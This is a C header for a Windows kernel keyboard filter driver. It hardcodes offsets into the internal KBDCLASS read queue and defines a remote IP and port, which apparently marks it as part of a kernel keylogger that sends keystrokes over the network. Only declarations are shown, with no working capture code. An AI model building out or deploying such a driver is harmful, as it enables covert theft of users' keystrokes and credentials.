/*++

Module Name:
    driver.h

Abstract:
    Common definitions, structures, and declarations for the keyboard
    filter driver. This header provides the core infrastructure for
    intercepting and processing keyboard input data.

Environment:
    Kernel mode only.

--*/

#pragma once

//
// System Headers
//
#include <ntifs.h>
#include <ntddk.h>
#include <ntddkbd.h>

//
// External References
//
extern POBJECT_TYPE* IoDriverObjectType;

//
// Architecture-Specific Offsets into KBDCLASS Device Extension
//
#ifdef _WIN64
    #define KBDCLASS_REMOVELOCK_OFFSET      0x20
    #define KBDCLASS_SPINLOCK_OFFSET        0xA0
    #define KBDCLASS_READQUEUE_OFFSET       0xA8
#else
    #define KBDCLASS_REMOVELOCK_OFFSET      0x10
    #define KBDCLASS_SPINLOCK_OFFSET        0x6C
    #define KBDCLASS_READQUEUE_OFFSET       0x70
#endif

//
// Debug output - compiled out in Release builds
//
#ifdef DBG
    #define KBDTRACE_ROUTINES               0x00000001
    #define KBDTRACE_OPERATION_STATUS       0x00000002
    
    const static ULONG gTraceFlags = KBDTRACE_ROUTINES | KBDTRACE_OPERATION_STATUS;
    
    #define KBD_DBG_PRINT(_level, _string)  \
        (FlagOn(gTraceFlags, (_level)) ?    \
            DbgPrint _string :              \
            ((int)0))
    
    #define KBD_ERROR(_fmt, ...)    DbgPrint("KBD ERROR: " _fmt "\n", __VA_ARGS__)
    #define KBD_INFO(_fmt, ...)     DbgPrint("KBD INFO: " _fmt "\n", __VA_ARGS__)
#else
    #define KBD_DBG_PRINT(_level, _string)  ((void)0)
    #define KBD_ERROR(_fmt, ...)            ((void)0)
    #define KBD_INFO(_fmt, ...)             ((void)0)
#endif

//
// Pool Tag for Memory Allocations
//
#define KBDDRIVER_POOL_TAG      'dbKK'

//
// Network Configuration
//
#define KBDDRIVER_REMOTE_IP         L"127.0.0.1"
#define KBDDRIVER_REMOTE_PORT       L"31415"

//
// Driver Structures
//

typedef struct _KBDDRIVER_KEYBOARD_OBJECT
{
    LIST_ENTRY          ListEntry;
    
    BOOLEAN             InitSuccess;
    BOOLEAN             SafeUnload;
    BOOLEAN             IrpCancel;
    
    PIRP                NewIrp;
    PIRP                RemoveLockIrp;
    
    KEVENT              Event;
    
    PFILE_OBJECT        KbdFileObject;
    PDEVICE_OBJECT      BttmDeviceObject;
    PDEVICE_OBJECT      KbdDeviceObject;
    
    ERESOURCE           Resource;
    
} KBDDRIVER_KEYBOARD_OBJECT, *PKBDDRIVER_KEYBOARD_OBJECT;

typedef struct _KBDDRIVER_DEVICE_EXTENSION
{
    KSPIN_LOCK          KbdObjSpinLock;
    LIST_ENTRY          KbdObjListHead;
    
    PDRIVER_OBJECT      KbdDriverObject;
    
    BOOLEAN             IsUnloading;
    
} KBDDRIVER_DEVICE_EXTENSION, *PKBDDRIVER_DEVICE_EXTENSION;

//
// Function Declarations
//

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
);

VOID 
KbdDriver_Unload(
    _In_ PDRIVER_OBJECT DriverObject
);

NTSTATUS
ObReferenceObjectByName(
    _In_     PUNICODE_STRING    ObjectName,
    _In_     ULONG              Attributes,
    _In_opt_ PACCESS_STATE      AccessState,
    _In_opt_ ACCESS_MASK        DesiredAccess,
    _In_     POBJECT_TYPE       ObjectType,
    _In_     KPROCESSOR_MODE    AccessMode,
    _Inout_opt_ PVOID           ParseContext,
    _Out_    PVOID*             Object
);

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#endif